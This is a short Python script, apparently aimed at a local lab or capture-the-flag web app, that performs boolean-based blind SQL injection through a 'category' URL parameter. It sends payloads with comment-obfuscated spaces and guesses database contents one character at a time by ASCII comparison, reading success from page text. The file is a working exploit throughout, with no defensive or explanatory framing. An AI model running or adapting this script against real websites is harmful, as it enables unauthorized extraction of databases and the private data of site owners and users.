import requests
import time

# Configuration
BASE_URL = "http://127.0.0.1:33050/"
TRUE_INDICATOR = "No posts found"
FALSE_INDICATOR = "Category does not exist"

def send_payload(payload):
    """Send request and check response type"""
    resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
    if TRUE_INDICATOR in resp.text:
        return True
    elif FALSE_INDICATOR in resp.text:
        return False
    else:
        return None

def extract_char_at(query, position):
    """Extract a single character using ASCII comparison"""
    # Printable ASCII range
    for ascii_val in range(32, 127):
        char = chr(ascii_val)
        payload = f"Nature'/**/AND/**/{ascii_val}=(SELECT/**/ASCII(SUBSTRING(({query}),{position},1)))--+-"
        resp = requests.get(f"{BASE_URL}?category={payload}", timeout=10)
        if TRUE_INDICATOR in resp.text:
            return char
    return None

def extract_string(query, max_length=100):
    """Extract string character by character"""
    result = ""
    for pos in range(1, max_length + 1):
        char = extract_char_at(query, pos)
        if char == '\x00' or char is None:
            break
        result += char
        if pos % 10 == 0:
            print(f"  Progress: {result}")
    return result

